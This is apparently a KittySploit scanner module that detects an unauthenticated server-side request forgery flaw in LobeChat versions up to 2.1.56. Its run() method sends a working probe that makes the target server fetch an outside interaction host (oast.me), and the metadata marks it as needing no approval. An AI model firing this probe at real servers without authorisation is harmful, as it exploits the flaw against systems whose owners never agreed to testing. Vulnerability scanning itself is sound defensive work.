#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LobeHub LobeChat versions up to and including 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LobeHub LobeChat <= 2.1.56 - Server-Side Request Forgery Detection',
        'description': 'LobeHub LobeChat versions up to and including 2.1.56 are vulnerable to an unauthenticated server-side request forgery vulnerability in the /webapi/proxy endpoint. The endpoint accepts a URL in the POST request body and fetches it server-side without authentication.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'lobechat', 'ssrf', 'vuln', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/lobehub/lobehub/security/advisories/GHSA-xmwj-c75x-6346',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-54157',
        ],
        'cve': 'CVE-2026-54157',
    }

    def run(self):
        path = '/welcome'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/webapi/proxy'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='http://oast.me\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<h1> Interactsh Server </h1>',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='LobeHub LobeChat <= 2.1.56 - Server-Side Request Forgery detected', path=path)
            return True
        return False

